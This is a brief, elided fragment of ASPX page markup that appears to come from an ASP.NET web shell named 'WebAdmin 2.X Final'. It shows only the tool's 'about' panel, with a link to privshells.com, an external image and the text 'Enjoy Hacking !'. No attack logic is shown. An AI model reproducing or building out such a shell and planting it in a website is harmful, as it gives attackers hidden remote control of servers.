...
<body>
    <form method="post" enctype="multipart/form-data" runat="server">
        ...
        <asp:Panel id="about" runat="server" Wrap="False" ToolTip="about WebAdmin 2.X Final" Visible="False" Width="789px" Height="25px" HorizontalAlign="Center">
            ...
            <asp:HyperLink id="HyperLink1" runat="server" Visible="True" Target="_blank" NavigateUrl="http://www.privshells.com">Web Aspx Shell</asp:HyperLink>
            <br />
            <asp:Image id="Image1" runat="server" ToolTip="Build20051225" Visible="True" ImageUrl="http://www.antikorea.com/me-2.jpg" AlternateText="Enjoy Hacking !"></asp:Image>
        </asp:Panel>
